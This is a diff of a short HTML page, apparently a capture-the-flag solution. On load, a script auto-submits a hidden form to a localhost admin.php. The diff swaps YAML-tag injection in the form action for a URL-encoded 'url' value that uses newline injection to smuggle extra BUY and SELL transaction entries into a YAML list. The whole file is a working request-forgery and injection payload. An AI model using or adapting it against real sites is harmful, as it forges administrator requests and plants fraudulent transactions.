@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
 <body>
-<form id="f" action="http://localhost:5000/admin.php?transactions[0][amount]=1&transactions[0][country]=fake&transactions[1]=- amount: !!int 1000000&#13;&#10;  !!str XYZ&#13;&#10;  !!str BUY&transactions[2]=- amount: !!int 1000000&#13;&#10;  !!str XYZ&#13;&#10;  !!str SELL&transactions[3]=- amount: !!int 1&#13;&#10;  !!str FL&#13;&#10;  !!str BUY" method="POST">
-<input name="url" type="hidden" value="">
+<form id="f" action="http://localhost:5000/admin.php" method="POST">
+<input name="url" type="hidden" value="http://localhost:5000/admin.php?transactions%5B0%5D%5Bcountry%5D=fake&transactions%5B0%5D%5Bamount%5D=1%0A-%20amount%3A%201000000%0A%20%20currency%3A%20XYZ%0A%20%20op%3A%20BUY%0A-%20amount%3A%201000000%0A%20%20currency%3A%20XYZ%0A%20%20op%3A%20SELL%0A-%20amount%3A%201%0A%20%20currency%3A%20FL%0A%20%20op%3A%20BUY">
 </form>
 <script>document.getElementById("f").submit();</script>
 </body>
